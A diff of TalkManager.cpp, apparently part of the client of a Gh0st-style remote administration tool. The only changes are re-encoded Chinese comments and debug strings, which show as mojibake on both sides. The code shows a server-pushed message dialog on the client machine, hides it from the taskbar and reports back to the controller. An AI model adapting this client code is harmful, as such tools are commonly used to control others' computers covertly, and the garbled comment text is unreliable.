@@ -1,4 +1,4 @@
-// TalkManager.cpp: implementation of the CTalkManager class.
+ï»¿// TalkManager.cpp: implementation of the CTalkManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -30,12 +30,12 @@ CTalkManager::CTalkManager(IOCPClient* ClientObject, int n, void* user):CManager
     HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
     m_ClientObject->Send2Server((char*)&bToken, 1, &mask);
     WaitForDialogOpen();
-    Mprintf("Talk ¹¹Ôì\n");
+    Mprintf("Talk æ„é€ \n");
 }
 
 CTalkManager::~CTalkManager()
 {
-    Mprintf("Talk Îö¹¹\n");
+    Mprintf("Talk ææ„\n");
 }
 
 VOID CTalkManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
@@ -48,7 +48,7 @@ VOID CTalkManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
     default: {
         memcpy(g_Buffer, szBuffer, min(ulLength, sizeof(g_Buffer)));
-        //´´½¨Ò»¸öDLG
+        //åˆ›å»ºä¸€ä¸ªDLG
         DialogBoxParamA(m_hInstance,MAKEINTRESOURCE(IDD_DIALOG),
                         NULL, DialogProc, (LPARAM)this);  //SDK   C   MFC  C++
         break;
@@ -66,9 +66,9 @@ INT_PTR CALLBACK CTalkManager::DialogProc(HWND hDlg, UINT uMsg,
         break;
     }
     case WM_INITDIALOG: {
-        // »ñÈ¡µ±Ç°´°¿ÚÑùÊ½
+        // è·å–å½“å‰çª—å£æ ·å¼
         LONG_PTR exStyle = GetWindowLongPtr(hDlg, GWL_EXSTYLE);
-        // ÒÆ³ı WS_EX_APPWINDOW ÑùÊ½£¬Ìí¼Ó WS_EX_TOOLWINDOW ÑùÊ½
+        // ç§»é™¤ WS_EX_APPWINDOW æ ·å¼ï¼Œæ·»åŠ  WS_EX_TOOLWINDOW æ ·å¼
         exStyle &= ~WS_EX_APPWINDOW;
         exStyle |= WS_EX_TOOLWINDOW;
         SetWindowLongPtr(hDlg, GWL_EXSTYLE, exStyle);
@@ -112,7 +112,7 @@ VOID CTalkManager::OnInitDialog(HWND hDlg)
 }
 
 
-VOID CTalkManager::OnDlgTimer(HWND hDlg)   //Ê±ÖÓ»Øµ÷
+VOID CTalkManager::OnDlgTimer(HWND hDlg)   //æ—¶é’Ÿå›è°ƒ
 {
     RECT  Rect;
     static int Height=0;
@@ -128,8 +128,8 @@ VOID CTalkManager::OnDlgTimer(HWND hDlg)   //Ê±ÖÓ»Øµ÷
             MoveWindow(hDlg, x,y-Height, WIN_WIDTH, Height,TRUE);
         } else {
             KillTimer(hDlg,ID_TIMER_CLOSE_WINDOW);
-            BYTE bToken = TOKEN_TALKCMPLT;				// °üº¬Í·ÎÄ¼ş Common.h
-            m_ClientObject->Send2Server((char*)&bToken, 1); // ·¢ËÍÔÊĞíÖØĞÂ·¢ËÍµÄÖ¸Áî
+            BYTE bToken = TOKEN_TALKCMPLT;				// åŒ…å«å¤´æ–‡ä»¶ Common.h
+            m_ClientObject->Send2Server((char*)&bToken, 1); // å‘é€å…è®¸é‡æ–°å‘é€çš„æŒ‡ä»¤
             EndDialog(hDlg,0);
         }
         break;
